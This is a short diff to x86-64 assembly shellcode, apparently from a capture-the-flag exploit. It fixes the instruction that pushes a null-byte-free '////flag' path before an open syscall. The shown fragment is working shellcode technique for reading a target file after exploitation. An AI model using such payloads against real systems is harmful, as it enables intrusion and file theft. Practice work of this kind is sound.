@@ -105,7 +105,8 @@ _start:
     # --- open("/flag", O_RDONLY) ---
     # Syscall: open (rax=2), path (rdi), flags (rsi=0, O_RDONLY)
     mov rax, 2
-    push 0x67616c662f2f2f2f ; "////flag" to avoid null bytes, can be cleaner
+    mov rbx, 0x67616c662f2f2f2f # "////flag" to avoid null bytes, can be cleaner
+    push rbx
     mov rdi, rsp
     xor rsi, rsi
     syscall
